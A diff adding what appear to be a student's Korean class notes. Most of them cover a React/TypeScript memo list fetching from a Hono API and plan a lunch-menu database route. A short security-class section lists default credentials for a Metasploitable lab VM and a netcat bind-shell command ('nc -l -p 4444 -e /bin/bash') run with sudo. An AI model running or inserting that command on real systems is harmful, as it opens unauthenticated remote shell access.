@@ -308,6 +308,88 @@ ps -ef | grep ssh
 vstp -> 파일을 주고받을 수 있다...,?
 
 
+<MeomoList 참고하여 Ranlunch 에 DB 삽입해보자>
+interface Memotype {
+  content: string;
+  createdDt: string;
+  updatedDt: string;
+  id: number;
+  title: string;
+}
+export default function MemoList() {
+  const API_BASE_URL = import.meta.env.VITE_API_BASE_URL;
+  const [memo, setMemo] = useState<Memotype[]>([]);
+
+  useEffect(() => {
+    getMemoList();
+    //
+  }, []);
+  async function getMemoList() {
+    const fetchOption = {
+      method: "GET",
+      headers: {
+        Authorization: "",
+      },
+    };
+    let res: any = await fetch(
+      `${API_BASE_URL}/api/board/get_memolist`,
+      fetchOption
+    );
+    res = await res.json();
+    setMemo(res?.data ?? []);
+    console.log(`## res :`, res);
+  }
+
+->  좋아 l_menu 라는 DB를 업로드를 해보자 
+# 0. HONO 서버에 넣어야하겠구나.
+MAIN -> index.ts  app.route("/api/menu", menu_router);
+
+1. interface 설정
+interface lunchMenutype {
+name : string; 
+price : number
+}
+
+2. API 함수 설정하기
+export default function MenuList() {
+  const API_BASE_URL = import.meta.env.VITE_API_BASE_URL;
+ ## 바인딩 변수 설정 나중에 ~~~  CAUTION! useState<interface's name []>([]);
+
+3. 불러오기 -> useEffect() 사용하여 getMenulist();
+
+4. getMenulist() 함수 제작 ~ 비동기 방식으로 받을 것. fetch 사용할 것 위에 것 그대로 쓰면 되겠는데
+
+5. 서버를 두개 열면.... 어떤 코드로 연동되는거냐 ? api_base_url?  
+let res: any = await fetch(
+      `${API_BASE_URL}/api/board/get_memolist`,
+      fetchOption
+    );
+    res = await res.json();
+    setMemo(res?.data ?? []);
+    console.log(`## res :`, res);
+
+
+
+전반적인 구조가 -> 
+  HONO -> react.js -> (tsx)
+
+----------------------------------2교시 보안 ---------------------------------
+admin
+password
+
+mataploitable
+sudo nc -l -p 4444 -e /bin/bash &
+jobs
+
+
+~~~~~
+
+
+어디서 html 가져온거샅은데 
+
+vim index.html
+
+
 
 
 하나씩 하나씩 
